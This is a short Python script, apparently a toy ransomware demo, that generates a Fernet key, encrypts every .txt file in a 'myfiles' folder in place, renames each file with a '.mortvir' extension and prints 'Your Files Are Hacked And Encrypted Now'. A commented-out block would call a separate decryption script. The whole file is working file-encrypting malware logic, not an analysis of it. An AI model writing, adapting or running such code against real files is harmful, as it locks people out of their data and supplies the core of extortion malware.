import os
import cryptography.fernet
from cryptography.fernet import Fernet
import glob
import time

key = Fernet.generate_key()
key_file = open("key_text.mortkey", "wb")
key_file.write(key)
key_file.close()
print(key)
items = []
for text in glob.glob('myfiles/*.txt'):
  items.append(text)

for file in items:
    with open(file, 'rb') as thefile:
          contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
          thefile.write(contents_encrypted)
    vir = ".mortvir"
    hacked = file+vir
    os.rename(file, hacked)

print("Your Files Are Hacked And Encrypted Now")

#print('decrypting in....')
#time.sleep(1)
#print('\n3')
#time.sleep(1)
#print('\n2')
#time.sleep(1)
#print('\n1')

#os.system('python decrypt_text.py')

#time.sleep(1)
#print("Your Files Are Decrypted Now")